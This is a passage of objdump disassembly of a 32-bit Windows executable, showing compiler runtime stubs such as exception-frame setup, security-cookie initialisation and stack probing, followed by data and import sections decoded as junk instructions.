  4072b2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4072b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4072bc:	mov    DWORD PTR fs:0x0,ecx
  4072c3:	pop    ecx
  4072c4:	pop    edi
  4072c5:	pop    esi
  4072c6:	pop    ebx
  4072c7:	mov    esp,ebp
  4072c9:	pop    ebp
  4072ca:	ret    
  4072cb:	mov    eax,DWORD PTR [ebp-0x14]
  4072ce:	mov    eax,DWORD PTR [eax]
  4072d0:	xor    ecx,ecx
  4072d2:	cmp    DWORD PTR [eax],0xc0000005
  4072d8:	sete   cl
  4072db:	mov    eax,ecx
  4072dd:	ret    
  4072de:	mov    esp,DWORD PTR [ebp-0x18]
  4072e1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4072e8:	xor    eax,eax
  4072ea:	mov    ecx,DWORD PTR [ebp-0x10]
  4072ed:	mov    DWORD PTR fs:0x0,ecx
  4072f4:	pop    ecx
  4072f5:	pop    edi
  4072f6:	pop    esi
  4072f7:	pop    ebx
  4072f8:	mov    esp,ebp
  4072fa:	pop    ebp
  4072fb:	ret    
  4072fc:	int3   
  4072fd:	int3   
  4072fe:	int3   
  4072ff:	int3   
  407300:	int3   
  407301:	int3   
  407302:	int3   
  407303:	int3   
  407304:	int3   
  407305:	int3   
  407306:	int3   
  407307:	int3   
  407308:	int3   
  407309:	int3   
  40730a:	int3   
  40730b:	int3   
  40730c:	int3   
  40730d:	int3   
  40730e:	int3   
  40730f:	int3   
  407310:	mov    edi,edi
  407312:	push   ebp
  407313:	mov    ebp,esp
  407315:	mov    eax,DWORD PTR [ebp+0x8]
  407318:	mov    ecx,0x5a4d
  40731d:	cmp    WORD PTR [eax],cx
  407320:	je     0x407326
  407322:	xor    eax,eax
  407324:	pop    ebp
  407325:	ret    
  407326:	mov    ecx,DWORD PTR [eax+0x3c]
  407329:	add    ecx,eax
  40732b:	xor    eax,eax
  40732d:	cmp    DWORD PTR [ecx],0x4550
  407333:	jne    0x407341
  407335:	mov    edx,0x10b
  40733a:	cmp    WORD PTR [ecx+0x18],dx
  40733e:	sete   al
  407341:	pop    ebp
  407342:	ret    
  407343:	int3   
  407344:	int3   
  407345:	int3   
  407346:	int3   
  407347:	int3   
  407348:	mov    edi,edi
  40734a:	push   ebp
  40734b:	mov    ebp,esp
  40734d:	sub    esp,0x14
  407350:	and    DWORD PTR [ebp-0xc],0x0
  407354:	and    DWORD PTR [ebp-0x8],0x0
  407358:	mov    eax,ds:0x408004
  40735d:	push   esi
  40735e:	push   edi
  40735f:	mov    edi,0xbb40e64e
  407364:	mov    esi,0xffff0000
  407369:	cmp    eax,edi
  40736b:	je     0x40737a
  40736d:	test   esi,eax
  40736f:	je     0x40737a
  407371:	not    eax
  407373:	mov    ds:0x408008,eax
  407378:	jmp    0x4073e4
  40737a:	lea    eax,[ebp-0xc]
  40737d:	push   eax
  40737e:	call   DWORD PTR ds:0x4090fc
  407384:	mov    eax,DWORD PTR [ebp-0x8]
  407387:	xor    eax,DWORD PTR [ebp-0xc]
  40738a:	mov    DWORD PTR [ebp-0x4],eax
  40738d:	call   DWORD PTR ds:0x40909c
  407393:	xor    DWORD PTR [ebp-0x4],eax
  407396:	call   DWORD PTR ds:0x4090a0
  40739c:	xor    DWORD PTR [ebp-0x4],eax
  40739f:	call   DWORD PTR ds:0x409100
  4073a5:	xor    eax,DWORD PTR [ebp-0x4]
  4073a8:	lea    ecx,[ebp-0x4]
  4073ab:	xor    eax,ecx
  4073ad:	mov    DWORD PTR [ebp-0x4],eax
  4073b0:	lea    eax,[ebp-0x14]
  4073b3:	push   eax
  4073b4:	call   DWORD PTR ds:0x4090a8
  4073ba:	mov    eax,DWORD PTR [ebp-0x10]
  4073bd:	xor    eax,DWORD PTR [ebp-0x14]
  4073c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4073c3:	xor    ecx,eax
  4073c5:	cmp    ecx,edi
  4073c7:	je     0x4073d1
  4073c9:	test   DWORD PTR ds:0x408004,esi
  4073cf:	jne    0x4073d6
  4073d1:	mov    ecx,0xbb40e64f
  4073d6:	mov    DWORD PTR ds:0x408004,ecx
  4073dc:	not    ecx
  4073de:	mov    DWORD PTR ds:0x408008,ecx
  4073e4:	pop    edi
  4073e5:	pop    esi
  4073e6:	mov    esp,ebp
  4073e8:	pop    ebp
  4073e9:	ret    
  4073ea:	int3   
  4073eb:	int3   
  4073ec:	int3   
  4073ed:	int3   
  4073ee:	int3   
  4073ef:	push   0x30000
  4073f4:	push   0x10000
  4073f9:	call   DWORD PTR ds:0x409148
  4073ff:	pop    ecx
  407400:	pop    ecx
  407401:	ret    
  407402:	int3   
  407403:	int3   
  407404:	int3   
  407405:	int3   
  407406:	int3   
  407407:	int3   
  407408:	jmp    DWORD PTR ds:0x409160
  40740e:	int3   
  40740f:	int3   
  407410:	int3   
  407411:	int3   
  407412:	int3   
  407413:	int3   
  407414:	push   0x407470
  407419:	push   DWORD PTR fs:0x0
  407420:	mov    eax,DWORD PTR [esp+0x10]
  407424:	mov    DWORD PTR [esp+0x10],ebp
  407428:	lea    ebp,[esp+0x10]
  40742c:	sub    esp,eax
  40742e:	push   ebx
  40742f:	push   esi
  407430:	push   edi
  407431:	mov    eax,ds:0x408004
  407436:	xor    DWORD PTR [ebp-0x4],eax
  407439:	xor    eax,ebp
  40743b:	mov    DWORD PTR [ebp-0x1c],eax
  40743e:	push   eax
  40743f:	mov    DWORD PTR [ebp-0x18],esp
  407442:	push   DWORD PTR [ebp-0x8]
  407445:	mov    eax,DWORD PTR [ebp-0x4]
  407448:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40744f:	mov    DWORD PTR [ebp-0x8],eax
  407452:	lea    eax,[ebp-0x10]
  407455:	mov    fs:0x0,eax
  40745b:	ret    
  40745c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40745f:	xor    ecx,ebp
  407461:	call   0x407090
  407466:	jmp    0x4076f1
  40746b:	int3   
  40746c:	int3   
  40746d:	int3   
  40746e:	int3   
  40746f:	int3   
  407470:	mov    edi,edi
  407472:	push   ebp
  407473:	mov    ebp,esp
  407475:	push   DWORD PTR [ebp+0x14]
  407478:	push   DWORD PTR [ebp+0x10]
  40747b:	push   DWORD PTR [ebp+0xc]
  40747e:	push   DWORD PTR [ebp+0x8]
  407481:	push   0x407090
  407486:	push   0x408004
  40748b:	call   0x40770a
  407490:	add    esp,0x18
  407493:	pop    ebp
  407494:	ret    
  407495:	int3   
  407496:	int3   
  407497:	int3   
  407498:	int3   
  407499:	int3   
  40749a:	int3   
  40749b:	int3   
  40749c:	int3   
  40749d:	int3   
  40749e:	int3   
  40749f:	int3   
  4074a0:	ret    
  4074a1:	int3   
  4074a2:	int3   
  4074a3:	int3   
  4074a4:	int3   
  4074a5:	int3   
  4074a6:	mov    edi,edi
  4074a8:	push   ebp
  4074a9:	mov    ebp,esp
  4074ab:	push   0x0
  4074ad:	call   DWORD PTR ds:0x409018
  4074b3:	push   DWORD PTR [ebp+0x8]
  4074b6:	call   DWORD PTR ds:0x40901c
  4074bc:	push   0xc0000409
  4074c1:	call   DWORD PTR ds:0x409094
  4074c7:	push   eax
  4074c8:	call   DWORD PTR ds:0x409098
  4074ce:	pop    ebp
  4074cf:	ret    
  4074d0:	int3   
  4074d1:	int3   
  4074d2:	int3   
  4074d3:	int3   
  4074d4:	int3   
  4074d5:	mov    edi,edi
  4074d7:	push   ebp
  4074d8:	mov    ebp,esp
  4074da:	sub    esp,0x324
  4074e0:	mov    ds:0x408180,eax
  4074e5:	mov    DWORD PTR ds:0x40817c,ecx
  4074eb:	mov    DWORD PTR ds:0x408178,edx
  4074f1:	mov    DWORD PTR ds:0x408174,ebx
  4074f7:	mov    DWORD PTR ds:0x408170,esi
  4074fd:	mov    DWORD PTR ds:0x40816c,edi
  407503:	data16 mov WORD PTR ds:0x408198,ss
  40750a:	data16 mov WORD PTR ds:0x40818c,cs
  407511:	data16 mov WORD PTR ds:0x408168,ds
  407518:	data16 mov WORD PTR ds:0x408164,es
  40751f:	data16 mov WORD PTR ds:0x408160,fs
  407526:	data16 mov WORD PTR ds:0x40815c,gs
  40752d:	pushf  
  40752e:	pop    DWORD PTR ds:0x408190
  407534:	mov    eax,DWORD PTR [ebp+0x0]
  407537:	mov    ds:0x408184,eax
  40753c:	mov    eax,DWORD PTR [ebp+0x4]
  40753f:	mov    ds:0x408188,eax
  407544:	lea    eax,[ebp+0x8]
  407547:	mov    ds:0x408194,eax
  40754c:	mov    eax,DWORD PTR [ebp-0x324]
  407552:	mov    DWORD PTR ds:0x4080d0,0x10001
  40755c:	mov    eax,ds:0x408188
  407561:	mov    ds:0x40808c,eax
  407566:	mov    DWORD PTR ds:0x408080,0xc0000409
  407570:	mov    DWORD PTR ds:0x408084,0x1
  40757a:	mov    DWORD PTR ds:0x408090,0x3
  407584:	push   0x4
  407586:	pop    eax
  407587:	imul   eax,eax,0x0
  40758a:	mov    DWORD PTR [eax+0x408094],0x2
  407594:	push   0x4
  407596:	pop    eax
  407597:	shl    eax,0x0
  40759a:	mov    ecx,DWORD PTR ds:0x408004
  4075a0:	mov    DWORD PTR [eax+0x408094],ecx
  4075a6:	push   0x4
  4075a8:	pop    eax
  4075a9:	shl    eax,1
  4075ab:	mov    ecx,DWORD PTR ds:0x408008
  4075b1:	mov    DWORD PTR [eax+0x408094],ecx
  4075b7:	push   0x4
  4075b9:	pop    eax
  4075ba:	imul   eax,eax,0x0
  4075bd:	mov    ecx,DWORD PTR ds:0x408004
  4075c3:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4075c7:	push   0x4
  4075c9:	pop    eax
  4075ca:	shl    eax,0x0
  4075cd:	mov    ecx,DWORD PTR ds:0x408008
  4075d3:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4075d7:	push   0x401050
  4075dc:	call   0x4074a6
  4075e1:	mov    esp,ebp
  4075e3:	pop    ebp
  4075e4:	ret    
  4075e5:	int3   
  4075e6:	int3   
  4075e7:	int3   
  4075e8:	int3   
  4075e9:	int3   
  4075ea:	mov    edi,edi
  4075ec:	push   ebp
  4075ed:	mov    ebp,esp
  4075ef:	mov    ds:0x408180,eax
  4075f4:	mov    DWORD PTR ds:0x40817c,ecx
  4075fa:	mov    DWORD PTR ds:0x408178,edx
  407600:	mov    DWORD PTR ds:0x408174,ebx
  407606:	mov    DWORD PTR ds:0x408170,esi
  40760c:	mov    DWORD PTR ds:0x40816c,edi
  407612:	data16 mov WORD PTR ds:0x408198,ss
  407619:	data16 mov WORD PTR ds:0x40818c,cs
  407620:	data16 mov WORD PTR ds:0x408168,ds
  407627:	data16 mov WORD PTR ds:0x408164,es
  40762e:	data16 mov WORD PTR ds:0x408160,fs
  407635:	data16 mov WORD PTR ds:0x40815c,gs
  40763c:	pushf  
  40763d:	pop    DWORD PTR ds:0x408190
  407643:	mov    DWORD PTR ds:0x4080d0,0x10001
  40764d:	mov    eax,DWORD PTR [ebp+0x4]
  407650:	mov    ds:0x408188,eax
  407655:	lea    eax,[ebp+0x4]
  407658:	add    eax,0x4
  40765b:	mov    ds:0x408194,eax
  407660:	mov    eax,ds:0x408188
  407665:	mov    ds:0x40808c,eax
  40766a:	mov    DWORD PTR ds:0x408080,0xc0000409
  407674:	mov    DWORD PTR ds:0x408084,0x1
  40767e:	mov    DWORD PTR ds:0x408090,0x1
  407688:	push   0x4
  40768a:	pop    eax
  40768b:	imul   eax,eax,0x0
  40768e:	mov    DWORD PTR [eax+0x408094],0x8
  407698:	push   0x401050
  40769d:	call   0x4074a6
  4076a2:	pop    ebp
  4076a3:	ret    
  4076a4:	int3   
  4076a5:	int3   
  4076a6:	int3   
  4076a7:	int3   
  4076a8:	int3   
  4076a9:	int3   
  4076aa:	int3   
  4076ab:	int3   
  4076ac:	push   0x407470
  4076b1:	push   DWORD PTR fs:0x0
  4076b8:	mov    eax,DWORD PTR [esp+0x10]
  4076bc:	mov    DWORD PTR [esp+0x10],ebp
  4076c0:	lea    ebp,[esp+0x10]
  4076c4:	sub    esp,eax
  4076c6:	push   ebx
  4076c7:	push   esi
  4076c8:	push   edi
  4076c9:	mov    eax,ds:0x408004
  4076ce:	xor    DWORD PTR [ebp-0x4],eax
  4076d1:	xor    eax,ebp
  4076d3:	push   eax
  4076d4:	mov    DWORD PTR [ebp-0x18],esp
  4076d7:	push   DWORD PTR [ebp-0x8]
  4076da:	mov    eax,DWORD PTR [ebp-0x4]
  4076dd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4076e4:	mov    DWORD PTR [ebp-0x8],eax
  4076e7:	lea    eax,[ebp-0x10]
  4076ea:	mov    fs:0x0,eax
  4076f0:	ret    
  4076f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4076f4:	mov    DWORD PTR fs:0x0,ecx
  4076fb:	pop    ecx
  4076fc:	pop    edi
  4076fd:	pop    edi
  4076fe:	pop    esi
  4076ff:	pop    ebx
  407700:	mov    esp,ebp
  407702:	pop    ebp
  407703:	push   ecx
  407704:	ret    
  407705:	int3   
  407706:	int3   
  407707:	int3   
  407708:	int3   
  407709:	int3   
  40770a:	jmp    DWORD PTR ds:0x40914c
  407710:	int3   
  407711:	int3   
  407712:	int3   
  407713:	int3   
  407714:	int3   
  407715:	int3   
  407716:	int3   
  407717:	int3   
  407718:	int3   
  407719:	int3   
  40771a:	int3   
  40771b:	int3   
  40771c:	int3   
  40771d:	int3   
  40771e:	int3   
  40771f:	int3   
  407720:	push   ecx
  407721:	lea    ecx,[esp+0x4]
  407725:	sub    ecx,eax
  407727:	sbb    eax,eax
  407729:	not    eax
  40772b:	and    ecx,eax
  40772d:	mov    eax,esp
  40772f:	and    eax,0xfffff000
  407734:	cmp    ecx,eax
  407736:	jb     0x407742
  407738:	mov    eax,ecx
  40773a:	pop    ecx
  40773b:	xchg   esp,eax
  40773c:	mov    eax,DWORD PTR [eax]
  40773e:	mov    DWORD PTR [esp],eax
  407741:	ret    
  407742:	sub    eax,0x1000
  407747:	test   DWORD PTR [eax],eax
  407749:	jmp    0x407734
  40774b:	int3   
  40774c:	int3   
  40774d:	int3   
  40774e:	int3   
  40774f:	int3   
  407750:	jmp    DWORD PTR ds:0x409190
  407756:	int3   
  407757:	int3   
  407758:	int3   
  407759:	int3   
  40775a:	int3   
  40775b:	int3   
  40775c:	jmp    DWORD PTR ds:0x409194
  407762:	int3   
  407763:	int3   
  407764:	int3   
  407765:	int3   
  407766:	int3   
  407767:	int3   
  407768:	jmp    DWORD PTR ds:0x409198
  40776e:	int3   
  40776f:	int3   
  407770:	in     al,0xff
  407772:	(bad)  
  407773:	inc    DWORD PTR [eax]
  407775:	add    BYTE PTR [eax],al
  407777:	add    BYTE PTR [eax],bh
  407779:	(bad)  
  40777a:	(bad)  
  40777b:	inc    DWORD PTR [eax]
  40777d:	add    BYTE PTR [eax],al
  40777f:	add    dh,bh
  407781:	(bad)  
  407782:	(bad)  
  407783:	(bad)  
  407784:	out    dx,al
  407785:	ins    BYTE PTR es:[edi],dx
  407786:	inc    eax
  407787:	add    bh,bh
  407789:	ins    BYTE PTR es:[edi],dx
  40778a:	inc    eax
  40778b:	add    dh,bh
  40778d:	(bad)  
  40778e:	(bad)  
  40778f:	call   FWORD PTR ds:0x2e00406d
  407795:	ins    DWORD PTR es:[edi],dx
  407796:	inc    eax
  407797:	add    ah,ah
  407799:	(bad)  
  40779a:	(bad)  
  40779b:	inc    DWORD PTR [eax]
  40779d:	add    BYTE PTR [eax],al
  40779f:	add    al,dl
  4077a1:	(bad)  
  4077a2:	(bad)  
  4077a3:	inc    DWORD PTR [eax]
  4077a5:	add    BYTE PTR [eax],al
  4077a7:	add    dh,bh
  4077a9:	(bad)  
  4077aa:	(bad)  
  4077ab:	call   edi
  4077ad:	outs   dx,DWORD PTR ds:[esi]
  4077ae:	inc    eax
  4077af:	add    bl,ch
  4077b1:	outs   dx,DWORD PTR ds:[esi]
  4077b2:	inc    eax
  4077b3:	add    BYTE PTR [eax],al
  4077b5:	add    BYTE PTR [eax],al
  4077b7:	add    dh,bh
  4077b9:	(bad)  
  4077ba:	(bad)  
  4077bb:	inc    DWORD PTR [eax]
  4077bd:	add    BYTE PTR [eax],al
  4077bf:	add    ah,dl
  4077c1:	(bad)  
  4077c2:	(bad)  
  4077c3:	inc    DWORD PTR [eax]
  4077c5:	add    BYTE PTR [eax],al
  4077c7:	add    dh,bh
  4077c9:	(bad)  
  4077ca:	(bad)  
  4077cb:	jmp    FWORD PTR [ecx+esi*2+0x40]
  4077cf:	add    BYTE PTR [eax+0x71],dh
  4077d2:	inc    eax
  4077d3:	add    BYTE PTR [eax],al
  4077d5:	add    BYTE PTR [eax],al
  4077d7:	add    dh,bh
  4077d9:	(bad)  
  4077da:	(bad)  
  4077db:	inc    DWORD PTR [eax]
  4077dd:	add    BYTE PTR [eax],al
  4077df:	add    al,bl
  4077e1:	(bad)  
  4077e2:	(bad)  
  4077e3:	inc    DWORD PTR [eax]
  4077e5:	add    BYTE PTR [eax],al
  4077e7:	add    dh,bh
  4077e9:	(bad)  
  4077ea:	(bad)  
  4077eb:	dec    ebx
  4077ed:	jb     0x40782f
  4077ef:	add    dh,bl
  4077f1:	jb     0x407833
	...

Disassembly of section .data:

00408000 <.data>:
  408000:	add    DWORD PTR [eax],eax
  408002:	add    BYTE PTR [eax],al
  408004:	dec    esi
  408005:	out    0x40,al
  408007:	mov    ebx,0x44bf19b1
	...
  408038:	add    BYTE PTR [eax],al
  40803a:	add    eax,DWORD PTR [eax]
  40803c:	loopne 0x407fc1
  40803e:	inc    eax
  40803f:	add    al,ch
  408041:	adc    BYTE PTR [eax+0x0],al
  408044:	adc    BYTE PTR [ecx],dl
  408046:	inc    eax
  408047:	add    BYTE PTR [ecx],al
  408049:	add    BYTE PTR [eax],al
  40804b:	add    BYTE PTR [ecx],al
	...

Disassembly of section .idata:

00409000 <.idata>:
  409000:	or     bl,BYTE PTR [ebp+0x0]
  409006:	add    BYTE PTR [eax],al
  409008:	ret    0x9b
  40900b:	add    BYTE PTR [eax],al
  40900d:	add    BYTE PTR [eax],al
  40900f:	add    ah,bl
  409011:	call   0x0:0x9aec0000
  409018:	pusha  
  409019:	xchg   edi,eax
  40901a:	add    BYTE PTR [eax],al
  40901c:	add    bl,BYTE PTR [eax+0x0]
  409022:	add    BYTE PTR [eax],al
  409024:	lods   al,BYTE PTR ds:[esi]
  409025:	call   0x0:0x9c0c0000
  40902c:	pusha  
  40902d:	call   0x0:0x9b520000
  409034:	mov    eax,0x9a
  409039:	add    BYTE PTR [eax],al
  40903b:	add    ah,bh
  40903d:	call   0x0:0x0
  409044:	sub    al,0x97
  409046:	add    BYTE PTR [eax],al
  409048:	outs   dx,BYTE PTR ds:[esi]
  409049:	call   0x0:0x9a520000
  409050:	xchg   BYTE PTR [edx-0x65860000],bl
  409056:	add    BYTE PTR [eax],al
  409058:	add    BYTE PTR [eax],al
  40905a:	add    BYTE PTR [eax],al
  40905c:	and    al,0x9c
  40905e:	add    BYTE PTR [eax],al
  409060:	(bad)  
  409061:	fwait
  409062:	add    BYTE PTR [eax],al
  409064:	add    BYTE PTR [eax],al
  409066:	add    BYTE PTR [eax],al
  409068:	jle    0x409001
  40906a:	add    BYTE PTR [eax],al
  40906c:	inc    esp
  40906d:	fwait
  40906e:	add    BYTE PTR [eax],al
  409070:	xor    BYTE PTR [ebx+0x0],bl
  409076:	add    BYTE PTR [eax],al
  409078:	call   0x96:0xec000096
  40907f:	add    BYTE PTR [ebx+ebx*4+0x0],dl
  409086:	add    BYTE PTR [eax],al
  409088:	mov    BYTE PTR [esi-0x642e0000],dl
  40908e:	add    BYTE PTR [eax],al
  409090:	add    BYTE PTR [eax],al
  409092:	add    BYTE PTR [eax],al
  409094:	push   ds
  409095:	cwde   
  409096:	add    BYTE PTR [eax],al
  409098:	xor    bl,BYTE PTR [eax-0x68540000]
  40909e:	add    BYTE PTR [eax],al
  4090a0:	ret    0x97
  4090a3:	add    BYTE PTR [eax],al
  4090a5:	add    BYTE PTR [eax],al
  4090a7:	add    BYTE PTR [edx+0x97],dl
  4090ad:	add    BYTE PTR [eax],al
  4090af:	add    BYTE PTR [eax+0x5200009a],bl
  4090b5:	xchg   edi,eax
  4090b6:	add    BYTE PTR [eax],al
  4090b8:	inc    edx
  4090b9:	xchg   edi,eax
  4090ba:	add    BYTE PTR [eax],al
  4090bc:	or     al,0x97
  4090be:	add    BYTE PTR [eax],al
  4090c0:	mov    esi,0x96
  4090c5:	add    BYTE PTR [eax],al
  4090c7:	add    BYTE PTR [edx],bl
  4090c9:	popf   
  4090ca:	add    BYTE PTR [eax],al
  4090cc:	cld    
  4090cd:	pushf  
  4090ce:	add    BYTE PTR [eax],al
  4090d0:	add    BYTE PTR [eax],al
  4090d2:	add    BYTE PTR [eax],al
  4090d4:	(bad)  
  4090d5:	call   0x0:0x9b5e0000
  4090dc:	add    BYTE PTR [eax],al
  4090de:	add    BYTE PTR [eax],al
  4090e0:	cld    
  4090e1:	cdq    
  4090e2:	add    BYTE PTR [eax],al
  4090e4:	lock cdq 
  4090e6:	add    BYTE PTR [eax],al
  4090e8:	add    BYTE PTR [eax],al
  4090ea:	add    BYTE PTR [eax],al
  4090ec:	or     bl,BYTE PTR [ebx-0x692e0000]
  4090f2:	add    BYTE PTR [eax],al
  4090f4:	sbb    bl,BYTE PTR [ebx+0x0]
  4090fa:	add    BYTE PTR [eax],al
  4090fc:	fcom   DWORD PTR [edi-0x680e0000]
  409102:	add    BYTE PTR [eax],al
  409104:	add    BYTE PTR [eax],al
  409106:	add    BYTE PTR [eax],al
  409108:	mov    al,0x96
  40910a:	add    BYTE PTR [eax],al
  40910c:	ficom  DWORD PTR [esi-0x68e40000]
  409112:	add    BYTE PTR [eax],al
  409114:	add    BYTE PTR [eax],al
  409116:	add    BYTE PTR [eax],al
  409118:	je     0x4090b5
  40911a:	add    BYTE PTR [eax],al
  40911c:	loop   0x4090b9
  40911e:	add    BYTE PTR [eax],al
  409120:	sbb    bl,BYTE PTR [eax+eax*1+0x9ba600]
  409127:	add    BYTE PTR [eax],al
  409129:	add    BYTE PTR [eax],al
  40912b:	add    BYTE PTR [edx],ch
  40912d:	popf   
  40912e:	add    BYTE PTR [eax],al
  409130:	add    BYTE PTR [eax],al
  409132:	add    BYTE PTR [eax],al
  409134:	ds xchg esi,eax
  409136:	add    BYTE PTR [eax],al
  409138:	push   ds
  409139:	xchg   esi,eax
  40913a:	add    BYTE PTR [eax],al
  40913c:	pop    esp
  40913d:	xchg   esi,eax
  40913e:	add    BYTE PTR [eax],al
  409140:	add    BYTE PTR [eax],al
  409142:	add    BYTE PTR [eax],al
  409144:	loop   0x4090db
  409146:	add    BYTE PTR [eax],al
  409148:	not    BYTE PTR [ebp-0x69fc0000]
  40914e:	add    BYTE PTR [eax],al
  409150:	mov    dh,0x95
  409152:	add    BYTE PTR [eax],al
  409154:	test   al,0x95
  409156:	add    BYTE PTR [eax],al
  409158:	sahf   
  409159:	xchg   ebp,eax
  40915a:	add    BYTE PTR [eax],al
  40915c:	xchg   esi,eax
  40915d:	xchg   ebp,eax
  40915e:	add    BYTE PTR [eax],al
  409160:	retf   0x95
  409163:	add    BYTE PTR [esi+0x7c000095],cl
  409169:	xchg   ebp,eax
  40916a:	add    BYTE PTR [eax],al
  40916c:	push   0xffffff95
  40916e:	add    BYTE PTR [eax],al
  409170:	inc    esi
  409171:	call   0x0:0x955c0000
  409178:	dec    esp
  409179:	xchg   ebp,eax
  40917a:	add    BYTE PTR [eax],al
  40917c:	ds call 0x0:0x953e0000
  409184:	xor    al,0x9a
  409186:	add    BYTE PTR [eax],al
  409188:	and    al,0x95
  40918a:	add    BYTE PTR [eax],al
  40918c:	xor    dl,BYTE PTR [ebp-0x62560000]
  409192:	add    BYTE PTR [eax],al
  409194:	mov    dl,0x9d
  409196:	add    BYTE PTR [eax],al
  409198:	mov    esp,0x9d
  40919d:	add    BYTE PTR [eax],al
  40919f:	add    BYTE PTR [eax-0x37ffbf8c],ah
  4091a5:	xchg   esp,eax
	...
  4091ae:	add    BYTE PTR [eax],al
  4091b0:	(bad)  
  4091b1:	xchg   ebp,eax
  4091b2:	add    BYTE PTR [eax],al
  4091b4:	inc    esp
  4091b5:	xchg   ecx,eax
  4091b6:	add    BYTE PTR [eax],al
  4091b8:	mov    eax,0x94
  4091bd:	add    BYTE PTR [eax],al
  4091bf:	add    BYTE PTR [eax],al
  4091c1:	add    BYTE PTR [eax],al
  4091c3:	add    BYTE PTR [edx-0x6a],bh
  4091c6:	add    BYTE PTR [eax],al
  4091c8:	xor    al,0x91
  4091ca:	add    BYTE PTR [eax],al
  4091cc:	or     al,0x94
	...
  4091d6:	add    BYTE PTR [eax],al
  4091d8:	inc    esi
  4091d9:	cwde   
  4091da:	add    BYTE PTR [eax],al
  4091dc:	mov    BYTE PTR [eax-0x6c040000],dl
	...
  4091ea:	add    BYTE PTR [eax],al
  4091ec:	je     0x409186
  4091ee:	add    BYTE PTR [eax],al
  4091f0:	js     0x409182
  4091f2:	add    BYTE PTR [eax],al
  4091f4:	mov    WORD PTR [eax+eax*1+0x0],ss
  4091fb:	add    BYTE PTR [eax],al
  4091fd:	add    BYTE PTR [eax],al
  4091ff:	add    BYTE PTR [eax+ebx*4-0x6ef80000],bl
  409206:	add    BYTE PTR [eax],al
  409208:	xor    al,0x94
	...
  409212:	add    BYTE PTR [eax],al
  409214:	les    ebx,FWORD PTR [eax-0x6f500000]
  40921a:	add    BYTE PTR [eax],al
  40921c:	jo     0x4091b2
	...
  409226:	add    BYTE PTR [eax],al
  409228:	call   0xec4092c5
  40922d:	nop
  40922e:	add    BYTE PTR [eax],al
  409230:	enter  0x93,0x0
	...
  40923c:	or     bl,BYTE PTR [ecx-0x6fbc0000]
  409242:	add    BYTE PTR [eax],al
  409244:	xchg   esp,eax
  409245:	xchg   ebx,eax
	...
  40924e:	add    BYTE PTR [eax],al
  409250:	sub    bl,BYTE PTR [ecx-0x6ff00000]
  409256:	add    BYTE PTR [eax],al
  409258:	in     al,dx
  409259:	xchg   ebx,eax
	...
  409262:	add    BYTE PTR [eax],al
  409264:	push   esp
  409265:	cdq    
  409266:	add    BYTE PTR [eax],al
  409268:	push   0x2c000090
  40926d:	xchg   esp,eax
	...
  409276:	add    BYTE PTR [eax],al
  409278:	jle    0x409213
  40927a:	add    BYTE PTR [eax],al
  40927c:	test   al,0x90
  40927e:	add    BYTE PTR [eax],al
  409280:	sbb    BYTE PTR [eax+eax*1+0x0],dl
  409287:	add    BYTE PTR [eax],al
  409289:	add    BYTE PTR [eax],al
  40928b:	add    BYTE PTR [edx-0x6bffff67],ah
  409291:	nop
  409292:	add    BYTE PTR [eax],al
  409294:	adc    BYTE PTR [eax+eax*1+0x0],0x0
  40929c:	add    BYTE PTR [eax],al
  40929e:	add    BYTE PTR [eax],al
  4092a0:	int3   
  4092a1:	cdq    
  4092a2:	add    BYTE PTR [eax],al
  4092a4:	cld    
  4092a5:	nop
  4092a6:	add    BYTE PTR [eax],al
  4092a8:	fs xchg esp,eax
	...
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	or     BYTE PTR [edx-0x6f200000],bl
  4092ba:	add    BYTE PTR [eax],al
  4092bc:	test   al,0x93
	...
  4092c6:	add    BYTE PTR [eax],al
  4092c8:	xor    BYTE PTR [eax+eax*1+0x902400],bl
  4092cf:	add    BYTE PTR [eax-0x6c],bl
	...
  4092da:	add    BYTE PTR [eax],al
  4092dc:	push   eax
  4092dd:	pushf  
  4092de:	add    BYTE PTR [eax],al
  4092e0:	aam    0x90
  4092e2:	add    BYTE PTR [eax],al
  4092e4:	rcl    BYTE PTR [ebx+0x0],0x0
  4092eb:	add    BYTE PTR [eax],al
  4092ed:	add    BYTE PTR [eax],al
  4092ef:	add    BYTE PTR [edx-0x64],dh
  4092f2:	add    BYTE PTR [eax],al
  4092f4:	cmp    al,0x90
  4092f6:	add    BYTE PTR [eax],al
  4092f8:	pushf  
  4092f9:	xchg   esp,eax
	...
  409302:	add    BYTE PTR [eax],al
  409304:	xchg   esp,eax
  409305:	pushf  
  409306:	add    BYTE PTR [eax],al
  409308:	sbb    BYTE PTR [ecx-0x6c740000],dl
	...
  409316:	add    BYTE PTR [eax],al
  409318:	mov    eax,0x800009c
  40931d:	nop
  40931e:	add    BYTE PTR [eax],al
  409320:	loopne 0x4092b5
	...
  40932a:	add    BYTE PTR [eax],al
  40932c:	fcomp  QWORD PTR [eax+eax*1+0x905c00]
  409333:	add    BYTE PTR [esp+edx*4+0x0],cl
	...
  40933f:	add    BYTE PTR [esi],bh
  409341:	popf   
  409342:	add    BYTE PTR [eax],al
  409344:	enter  0x90,0x0
  409348:	test   BYTE PTR [ebx+0x0],dl
  40934e:	add    BYTE PTR [eax],al
  409350:	add    BYTE PTR [eax],al
  409352:	add    BYTE PTR [eax],al
  409354:	bound  ebx,QWORD PTR [ebp-0x70000000]
  40935a:	add    BYTE PTR [eax],al
  40935c:	mov    al,0x94
	...
  409366:	add    BYTE PTR [eax],al
  409368:	sbb    BYTE PTR [ebp-0x6ed40000],0x0
	...
  409383:	add    BYTE PTR [edx],cl
  409385:	popf   
  409386:	add    BYTE PTR [eax],al
  409388:	add    BYTE PTR [eax],al
  40938a:	add    BYTE PTR [eax],al
  40938c:	ret    0x9b
  40938f:	add    BYTE PTR [eax],al
  409391:	add    BYTE PTR [eax],al
  409393:	add    ah,bl
  409395:	call   0x0:0x9aec0000
  40939c:	pusha  
  40939d:	xchg   edi,eax
  40939e:	add    BYTE PTR [eax],al
  4093a0:	add    bl,BYTE PTR [eax+0x0]
  4093a6:	add    BYTE PTR [eax],al
